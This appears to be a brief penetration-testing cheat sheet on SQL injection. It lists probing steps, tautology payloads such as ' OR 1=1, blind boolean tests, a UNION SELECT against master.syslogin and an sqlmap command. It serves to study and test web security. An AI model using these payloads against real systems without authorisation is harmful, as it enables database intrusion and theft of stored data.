
## SQL Testing :


- __Define__ all the user inputs and fields 

- __Confirm__ the web app backend runs SQL. One way of confi rming that the application is interacting with a backend
              database is to submit the SQL wildcard character % in a given parameter

- __Submit a single quotation__ mark as the item of data you are targeting.


- Observe whether an error occurs, or whether the result differs from the original in any other way.
  

- __submit two single quotation__ marks together for testing. Sometimes one single quote is not enough to show the error.


__Basic Payloads___


    >> ' OR 1=1 ;--
    
    >> ') OR 1=1; --
    
    
- __URL encodings__ are necessary whether you are editing the parameter’s  value directly from your browser, with an intercepting 
                    proxy, or through any other means.
    
    


### Blind SQL : 

This type of SQL injection is based on booleans : True or False .


- ' and 'a'='a

- ' and 'a'='b

- ' and substring(@@version,1,1)='5   &nbsp; |  &nbsp; find the version of the db



Automate the process of SQL blind
>> script 


### Band SQL:

- ' and 'a'='a

- ' and 'a'='b

- 9999' UNION SELECT name,222,'else1' FROM master.syslogin; --


### SQLmap:

- sqlmap  &nbsp; -u URL  &nbsp; -p search  &nbsp; --technique=U |  &nbsp; U for Union Selection
